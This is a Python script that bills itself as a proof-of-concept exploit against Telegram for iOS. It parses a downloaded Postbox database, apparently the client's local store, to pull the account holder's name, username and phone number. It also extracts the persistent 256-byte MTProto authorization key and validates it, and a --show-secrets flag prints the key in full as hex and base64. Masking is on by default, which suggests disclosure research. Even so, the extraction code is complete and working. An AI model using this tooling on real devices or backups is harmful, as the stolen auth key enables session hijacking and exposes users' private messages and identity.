#!/usr/bin/env python3
"""Open a downloaded Postbox DB and show its account data (censored by default)."""
import argparse
import base64
import hashlib
import plistlib
import re
import sqlite3
import tempfile
from pathlib import Path

SELF_PEER_ID = 0
DC_SELECTOR_PERSISTENT = 1


def fixed_db_copy(src):
    data = Path(src).read_bytes()
    ps = int.from_bytes(data[16:18], 'big') or 4096
    pages = int.from_bytes(data[28:32], 'big')
    actual = len(data) // ps
    if actual and actual < pages:
        b = bytearray(data)
        b[28:32] = actual.to_bytes(4, 'big')
        data = bytes(b)
    tmp = tempfile.NamedTemporaryFile(prefix='postbox_decode_', suffix='.db', delete=False)
    tmp.write(data)
    tmp.close()
    return Path(tmp.name), len(data), ps, actual or pages, pages


def field(blob, name):
    pat = bytes([len(name)]) + name.encode('ascii') + b'\x04'
    i = blob.find(pat)
    if i < 0:
        return None
    n = int.from_bytes(blob[i + len(pat):i + len(pat) + 4], 'little')
    raw = blob[i + len(pat) + 4:i + len(pat) + 4 + n]
    try:
        return raw.decode('utf-8')
    except Exception:
        return raw.decode('latin1')


def mask_value(value, keep=3):
    s = str(value)
    if len(s) <= keep:
        return s
    return s[:keep] + '*' * (len(s) - keep)


def mask_short(value, keep=3):
    s = str(value)
    if len(s) <= keep:
        return s
    return s[:keep] + '...'


def fmt_phone(raw):
    if not raw:
        return None
    d = re.sub(r'\D', '', raw)
    if d.startswith('00'):
        d = d[2:]
    if len(d) == 12 and d.startswith('39'):
        n = d[2:]
        return '+39 %s %s %s' % (n[:3], n[3:6], n[6:])
    if len(d) > 2:
        return '+%s %s' % (d[:2], d[2:])
    return '+' + d


def censor_phone(raw):
    d = re.sub(r'\D', '', raw or '')
    return mask_value(d, 3)


def deref(objs, value):
    return objs[value.data] if isinstance(value, plistlib.UID) else value


def auth_from_t1(db):
    con = sqlite3.connect('file:%s?mode=ro' % db, uri=True)
    row = con.execute('SELECT value FROM t1 WHERE key=?',
                      (b'persistent:datacenterAuthInfoById',)).fetchone()
    con.close()
    if not row:
        raise SystemExit('t1 keychain entry not found')
    pl = plistlib.loads(bytes(row[0]))
    objs = pl['$objects']
    root = deref(objs, pl['$top']['root'])
    for kuid, vuid in zip(root['NS.keys'], root['NS.objects']):
        k = deref(objs, kuid)
        if not isinstance(k, int):
            continue
        dc = k & 0xffffffff
        selector = k >> 32
        if selector != DC_SELECTOR_PERSISTENT or dc not in (1, 2, 3, 4, 5):
            continue
        info = deref(objs, vuid)
        aid = info.get('authKeyId')
        ko = deref(objs, info.get('authKey'))
        if isinstance(ko, dict):
            ko = deref(objs, ko.get('NS.data'))
        if not isinstance(ko, (bytes, bytearray)) or len(ko) != 256:
            continue
        key = bytes(ko)
        calc = int.from_bytes(hashlib.sha1(key).digest()[12:20], 'little')
        if calc != aid:
            continue
        return {'dc': dc, 'auth_key_id': aid, 'key': key}
    raise SystemExit('no persistent auth key in t1')


def content_counts(con):
    out = []
    for table, label in (('t2', 'users'), ('t7', 'messages'),
                         ('t8', 'chatlist'), ('t16', 'contacts')):
        try:
            n = con.execute('SELECT count(*) FROM %s' % table).fetchone()[0]
            out.append('%s=%d' % (label, n))
        except Exception:
            pass
    return ', '.join(out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('db', nargs='?', default='postbox_dump/db_sqlite')
    ap.add_argument('--show-secrets', action='store_true',
                    help='print full id/phone/name/auth key (default: censored)')
    a = ap.parse_args()

    print('=' * 62)
    print(' PoC Exploit Telegram iOS 27 - DB')
    print('=' * 62)
    path, size, ps, actual, header_pages = fixed_db_copy(a.db)
    print('DB: %s  bytes=%d  pages=%d (header %d)' % (a.db, size, actual, header_pages))
    con = sqlite3.connect('file:%s?mode=ro' % path, uri=True)
    print('CONTENT:', content_counts(con))
    row = con.execute('SELECT value FROM t2 WHERE key=?', (SELF_PEER_ID,)).fetchone()
    con.close()
    if row:
        v = bytes(row[0])
        name = ' '.join(x for x in (field(v, 'fn'), field(v, 'ln')) if x)
        un = field(v, 'un')
        phone = field(v, 'p')
        if a.show_secrets:
            print('SELF: id=%d name=%s username=%s phone=%s' % (
                SELF_PEER_ID, name, un, phone))
            print('PHONE:', fmt_phone(phone))
        else:
            print('SELF: id=%s name=%s username=%s phone=%s (censored)' % (
                mask_value(SELF_PEER_ID, 3), mask_value(name, 3),
                mask_value(un, 3) if un else '', censor_phone(phone)))
            print('PHONE:', censor_phone(phone), '(censored)')
    else:
        print('SELF: peer %d not found' % SELF_PEER_ID)

    auth = auth_from_t1(path)
    if a.show_secrets:
        print('AUTH: dc=%d auth_key_id=%d key_len=%d' % (
            auth['dc'], auth['auth_key_id'], len(auth['key'])))
        print('AUTHKEY_HEX:', auth['key'].hex())
        print('AUTHKEY_B64:', base64.b64encode(auth['key']).decode())
    else:
        print('AUTH: dc=%d auth_key_id=%s key_len=%d (censored)' % (
            auth['dc'], mask_short(auth['auth_key_id'], 3), len(auth['key'])))
        print('AUTHKEY_HEX:', mask_short(auth['key'].hex(), 3), '(censored)')
    try:
        path.unlink()
    except Exception:
        pass


if __name__ == '__main__':
    main()
